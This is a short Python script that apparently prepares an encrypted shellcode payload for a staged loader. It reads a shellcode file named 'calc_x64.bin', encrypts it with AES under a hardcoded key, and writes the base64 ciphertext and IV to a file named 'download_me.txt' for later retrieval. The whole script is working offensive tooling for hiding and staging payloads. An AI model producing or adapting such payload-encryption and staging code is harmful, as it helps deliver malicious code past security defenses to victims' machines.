from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from base64 import b64encode, b64decode
import urllib.request

key = b'eax94il288nyq0rv'

def aes_encrypt(plaintext, key):
    iv = get_random_bytes(AES.block_size)
    cipher = AES.new(key, AES.MODE_CFB, iv)
    ciphertext = cipher.encrypt(plaintext)
    return ciphertext, iv

def aes_decrypt(ciphertext, key, iv):
    cipher = AES.new(key, AES.MODE_CFB, iv)
    plaintext = cipher.decrypt(ciphertext)
    return plaintext

with open('calc_x64.bin', 'rb') as f:
    shellcode = f.read()

ciphertext, iv = aes_encrypt(shellcode, key)

ciphertext = b64encode(ciphertext).decode()
iv = b64encode(iv).decode()

message = f'{ciphertext}:{iv}'

with open('download_me.txt', 'w') as f:
    f.write(message)
